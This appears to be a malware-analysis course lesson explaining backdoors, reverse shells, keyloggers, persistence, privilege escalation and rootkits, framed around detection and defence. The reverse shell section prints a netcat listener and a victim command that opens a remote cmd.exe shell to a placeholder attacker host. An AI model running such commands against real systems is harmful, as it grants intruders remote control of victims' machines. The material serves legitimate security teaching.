# Lesson 3. Malware Mechanisms and Behaviour

## 1. **Backdoors**
A backdoor in a computer system, software, or network is essentially a hidden entry point that allows remote access to the system. It's like secretly adding a hidden door to a house that only the installer knows about, allowing them to enter whenever they want without anyone else knowing.

- **Common Features**:
  - Manipulate system settings and files.
  - Often use HTTP (port 80) to blend in with normal traffic.

### Reverse Shells
A reverse shell is a type of backdoor that essentially makes the targeted computer reach out to another computer (controlled by an attacker) and open a remote command line interface. In essence, it reverses the typical communication model; instead of the attacker directly connecting to the system, the system connects back to the attacker.

- **Netcat Example**:
  - Listener setup: `nc -l â€“p 80`
  - Victim connection: `nc listener_ip 80 -e cmd.exe`

## 2. **Keystroke Logging**

Keystroke logging, or keylogging, involves recording the keys struck on a keyboard, typically covertly, so that the person using the keyboard is unaware that their actions are being monitored. This can capture everything from personal messages to usernames and passwords.

- **Purpose**: Captures users' keystrokes to steal sensitive information like passwords.
- **Types**:
  - **Hardware Keyloggers**: Installed between the keyboard and machine, often require physical access for data retrieval.
  - **Kernel-based**: Part of a rootkit, acts as a driver, highly stealthy.
  - **User-space**: Uses Windows API functions such as `GetAsyncKeyState` and `GetForegroundWindow`.

## 3. **Persistence**

Persistence in the context of malware refers to the techniques that malware uses to remain active on an infected system even after reboots, updates, or attempts to clean the system. This could involve the malware adding itself to a list of programs that are automatically started each time the computer boots up.

## 4. **Privilege Escalation**

Privilege escalation occurs when a user or process gains elevated access to resources that are normally protected from an application or user. This means a regular user gaining administrator-level permissions through vulnerabilities in the system, which can then allow them to execute commands and access data that are normally restricted.

- **Objective**: Gain higher privileges on the system to execute actions restricted to administrators or system processes.
- **Common Techniques**:
  - Exploiting known vulnerabilities.
  - Using the `SeDebugPrivilege` to modify access tokens and gain extensive system controls.

## 5. **Rootkits**

A rootkit is a type of malicious software that is designed to gain unauthorized root or administrative access to a computer or network. The rootkit hides its existence and actions from users and other system processes, making it extremely difficult to detect and remove.

- **Example**: Modifying the System Service Descriptor Table (SSDT) to intercept system calls.


## Relationship to Malware Analysis
Understanding these concepts is critical in malware analysis for several reasons:

- **Detection**: Analysts need to know what types of behaviors to look for, such as unexpected network connections (reverse shells), unauthorized access attempts (backdoors, privilege escalation), and signs of covert monitoring (keyloggers).

- **Response**: Knowing how these threats operate helps in developing appropriate response strategies that can contain and mitigate damage. For example, if persistence mechanisms are understood, they can be targeted and disabled during remediation.

- **Prevention**: Understanding how attackers exploit systems via these methods can lead to better defenses, such as improved security protocols, better user education, and enhanced monitoring systems.
